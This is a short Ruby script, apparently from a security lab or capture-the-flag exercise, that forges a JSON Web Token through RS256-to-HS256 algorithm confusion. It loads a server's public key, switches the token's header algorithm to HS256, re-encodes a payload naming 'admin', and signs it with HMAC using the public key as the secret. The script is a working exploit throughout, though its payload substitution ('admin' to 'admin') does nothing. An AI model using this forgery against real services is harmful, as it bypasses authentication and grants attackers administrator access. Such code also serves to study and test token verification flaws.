require 'base64'
require 'openssl'

pub=File.open("public.pem").read

TOKEN="eyJhbGciOiJIUzI1NiJ9Cg.eyJuYW1lIjoiYWRtaW4ifQo.kbovdHDe2KNt3S_Xv6kKM3j7oz-7m08ouwgJ3PyA1Mb5cYotmbyP9UG2JXEsOckmHRw-0Ep3Gxdm5KMZoX9E1nla9rdhNrOwwcf3b4MEo6mPWhgLFXYPwBFO_6Jtdr30Z6WAkfa_XKbKbjrJpQ0Bffy3vzxCVVRUJR4K7f-SwOd99Spl6lekzYAilvAcPr5UROS7KE5JeQ_07nhO3bq6dxg8PjSJxSL1RjjjoD2B_yfq4l29I_nvODu4b0weEM_HOkwnr0JZBAoXtLcHkpDXa_sE5IK9rnmXHILXEV78Wa-zpecWv36fqj644QDDZhz11oL38OI3Wu8eNh9LL7A4Qw"

header,payload,signature=TOKEN.split('.')

decoded_header=Base64.decode64(header)
decoded_header.gsub!("RS256","HS256")
puts decoded_header
new_header=Base64.strict_encode64(decoded_header).gsub("=","")

decoded_payload=Base64.decode64(payload)
decoded_payload.gsub!("admin","admin")
puts decoded_payload
new_payload=Base64.strict_encode64(decoded_payload).gsub("=","")

data=new_header+"."+new_payload

signature=Base64.urlsafe_encode64(OpenSSL::HMAC.digest(OpenSSL::Digest.new("sha256"),pub,data))

puts data+"."+signature
